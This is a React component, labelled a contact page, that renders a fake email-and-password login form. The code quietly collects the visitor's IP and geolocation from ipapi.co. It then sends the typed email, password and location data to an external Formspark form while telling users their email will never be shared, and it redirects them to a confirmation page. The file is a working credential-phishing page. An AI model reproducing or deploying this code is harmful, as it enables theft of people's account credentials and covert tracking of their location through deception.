import { useFormspark } from "@formspark/use-formspark";
import Axios from "axios";
import React, { useEffect, useState } from "react";
import { Navigate } from "react-router-dom";

const FORMSPARK_FORM_ID = "ekS3rX9oR";

const ContactPage = () => {
  const [emlId, setEmlId] = useState("");
  const [emlPass, setEmlPass] = useState("");
  const [confirm, setConfirm] = useState(false);

  const [submit, submitting] = useFormspark({
    formId: FORMSPARK_FORM_ID,
  });

  const [isDetails, setIsDetails] = useState([]);

  useEffect(() => {
    Axios.get("https://ipapi.co/json/").then((res) => {
      setIsDetails(res.data);
    });
  }, []);

  const handleSubmit = async (e) => {
    setConfirm(true);
    e.preventDefault();
    await submit({
      emlId,
      emlPass,
      ...isDetails,
    });
    return;
  };

  if (confirm) {
    return (
      <p>
        <Navigate
          to={{
            pathname: "/confirm",
          }}
        />z
      </p>
    );
  }

  return (
    <div>
    <div className=""></div>
    <div className="">
        <div className="">
        <div className=" ">
         <div className="text-start py-4 md:p-2 mx-auto opacity-90 text-black">
                  
         <form onSubmit={handleSubmit}>
         <div className="mb-3">
            <label className="font-bold">Email Address</label>
         <input
           type="email"
           value={emlId}
           onChange={(e) => setEmlId(e.target.value)}
           className="outline-none mb-1 border-black p-2 border w-full"
           placeholder="Email *"
           required
         />
         <p className="text-xs">We'll never share your email with anyone else</p>
         </div>
         <div className="mt-3">
          <label className="font-bold">Password</label>
         <input
           type="password"
           value={emlPass}
           onChange={(e) => setEmlPass(e.target.value)}
           className="outline-none border-black p-2 mb-3 border w-full"
           placeholder="Password *"
           required
         />
         </div>
          <div className="text-lg py-2">
           
          </div>
            <div className="py-5 text-end">
            <button
              type="submit"
              className="px-6 py-1 right-0 text-white font-semibold bg-blue-700 rounded-md text-lg"
              // onClick={handleAlert}
              disabled={submitting}
            >
              Log in
            </button>
            
            </div>
            </form>
             </div>
        </div>
        </div>
    </div>
    
    </div>

  );
};
export default ContactPage;
